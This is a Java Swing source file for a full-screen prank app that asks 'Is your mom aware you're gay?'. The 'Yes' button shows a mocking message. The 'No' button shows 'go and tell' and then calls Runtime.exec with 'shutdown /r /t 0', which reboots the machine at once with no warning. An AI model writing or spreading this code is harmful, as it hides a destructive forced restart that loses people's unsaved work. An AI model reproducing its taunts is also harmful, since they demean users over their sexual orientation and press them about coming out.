import javax.swing.*;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;

public class GayQuestionApp {
    public static void main(String[] args) {
        SwingUtilities.invokeLater(GayQuestionApp::createAndShowGUI);
    }

    private static void createAndShowGUI() {
        JFrame frame = new JFrame("Is your mom aware you're gay?");
        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        frame.setExtendedState(JFrame.MAXIMIZED_BOTH);

        JPanel panel = new JPanel();
        panel.setLayout(new GridBagLayout());

        GridBagConstraints gbc = new GridBagConstraints();
        gbc.gridx = 0;
        gbc.gridy = 0;
        gbc.gridwidth = 2;
        gbc.insets = new Insets(0, 0, 30, 0);

        JLabel questionLabel = new JLabel("Is your mom aware you're gay?");
        questionLabel.setFont(questionLabel.getFont().deriveFont(24.0f));
        panel.add(questionLabel, gbc);

        JButton yesButton = new JButton("Yes");
        yesButton.addActionListener(e -> {
            JOptionPane.showMessageDialog(frame, "Well, okay, little gay");
            frame.dispose();
        });

        JButton noButton = new JButton("No");
        noButton.addActionListener(e -> {
            JOptionPane.showMessageDialog(frame, "Well, go and tell)");
            try {
                Runtime.getRuntime().exec("shutdown /r /t 0");
            } catch (Exception ex) {
                ex.printStackTrace();
            }
        });

        gbc.gridy = 1;
        gbc.insets = new Insets(0, 50, 0, 50);
        panel.add(yesButton, gbc);

        gbc.gridy = 2;
        panel.add(noButton, gbc);

        frame.add(panel);
        frame.setVisible(true);
    }
}